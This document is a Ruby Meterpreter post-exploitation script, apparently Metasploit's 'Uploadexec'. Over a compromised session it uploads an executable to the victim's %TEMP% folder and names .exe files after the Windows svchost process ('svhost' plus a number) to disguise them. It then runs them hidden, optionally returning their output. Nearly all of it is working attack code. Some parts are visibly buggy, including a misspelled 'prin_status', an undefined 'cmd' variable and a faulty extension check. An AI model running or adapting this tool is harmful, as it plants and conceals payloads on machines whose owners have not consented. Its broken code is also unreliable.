session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu."                        ],
	"-e" => [ true, "Executable or script to upload to target host."],
	"-o" => [ true,"Options for executable."],
	"-p" => [ false,"Path on target where to upload executable if none given %TEMP% directory will be used."],
        "-v" => [ false,"Verbose, return output of execution of uploaded executable."]

)
################## function declaration Declarations ##################
def usage()
	print(
		"Uploadexec Meterpreter Script\n" +
		  "It has the functionality to upload a desired executable or script and execute\n"+
		  "the file uploaded"
	)
	puts "\n\t-h \t\tHelp menu."
	puts "\t-e <opt> \tExecutable or script to upload to target host"
	puts "\t-o <opt> \tOptions for executable"
	puts "\t-p <opt> \tPath on target where to upload executable if none given %TEMP% directory will be used"
        puts "\t-v       \tVerbose, return output of execution of uploaded executable."

end
def upload(session,file,trgloc = "")
        if not ::File.exists?(file)
                raise "File to Upload does not exists!"
        else
                if trgloc == nil
                location = session.fs.file.expand_path("%TEMP%")
                else
                        location = trgloc
                end
                begin
			ext = ""
			ext = file.scan(/\S*(.exe)/i)
            		if ext == ".exe"
                                fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
                        else
                                fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
                        end
                        print_status("Uploading #{file}....")
                        session.fs.file.upload_file("#{fileontrgt}","#{file}")
                        print_status("#{file} uploaded!")
                        print_status("#{fileontrgt}")
                rescue ::Exception => e
                        print_status("Error uploading file #{file}: #{e.class} #{e}")
                end
        end
        return fileontrgt
end
#Function for executing a list of commands
def cmd_exec(session,cmdexe,opt,verbose)
	r=''
	session.response_timeout=120
	if verbose == 1
		begin
			print_status "Running command #{cmdexe}"
			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)

				prin_status("\t#{d}")
			end
			r.channel.close
			r.close
		rescue ::Exception => e
			print_status("Error Running Command #{cmd}: #{e.class} #{e}")
		end
	else
		begin
                        print_status "\trunning command #{cmdexe}"
                        r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
                        r.close
                rescue ::Exception => e
                        print_status("Error Running Command #{cmd}: #{e.class} #{e}")
                end
	end
end
#parsing of Options
file = ""
cmdopt = ""
helpcall = 0
path = ""
verbose = 0 
@@exec_opts.parse(args) { |opt, idx, val|
	case opt

	when "-e"
		file = val
	when "-o"
		cmdopt = val
	when "-p"
		path = val
        when "-v"
                verbose = 1
	when "-h"
		helpcall = 1
	end

}
if args.length != 0 or helpcall != 0
	exec = upload(session,file,path)
	cmd_exec(session,exec,cmdopt,verbose)	
else
	usage()
end
